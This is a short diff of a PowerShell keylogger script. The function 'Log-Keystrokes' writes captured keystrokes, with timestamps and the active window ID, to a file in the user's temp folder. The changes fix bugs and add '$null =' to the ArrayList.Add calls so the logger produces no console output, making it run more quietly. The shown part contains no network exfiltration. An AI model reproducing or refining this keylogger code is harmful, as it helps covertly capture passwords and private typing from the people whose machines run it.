@@ -36,10 +36,10 @@ function get-activewin()
 function output-line($logPath, $ary_str, $cnt){
   $activewin = get-activewin
   $arylst = New-Object System.Collections.ArrayList
-  $arylst.Add((Get-Date).ToString($C_dateformat))
-  $arylst.Add($activewin.Id)
-  $arylst.Add($cnt)
-  $arylst.Add($ary_str)
+  $null = $arylst.Add((Get-Date).ToString($C_dateformat))
+  $null = $arylst.Add($activewin.Id)
+  $null = $arylst.Add($cnt)
+  $null = $arylst.Add($ary_str)
   $ary = $arylst.ToArray()
   $line = [String]::Join("`t", $ary)
   [System.IO.File]::AppendAllText($logPath, $line + "`r`n", $C_Encode)
@@ -113,12 +113,12 @@ function Log-Keystrokes($logPath="$env:temp\Keystrokes.txt")
       output-line($logPath, $ary_str, $cnt)
       $i = 0
       $buf = ''
-      $lst.Clear()
+      $arylst.Clear()
     }
   }
   finally
   { 
-    $arylst.Add($buf)
+    $null = $arylst.Add($buf)
     $ary = $arylst.ToArray()
     $ary_str = [string]::Join(",",$ary)
     output-line($logPath, $ary_str, $cnt)
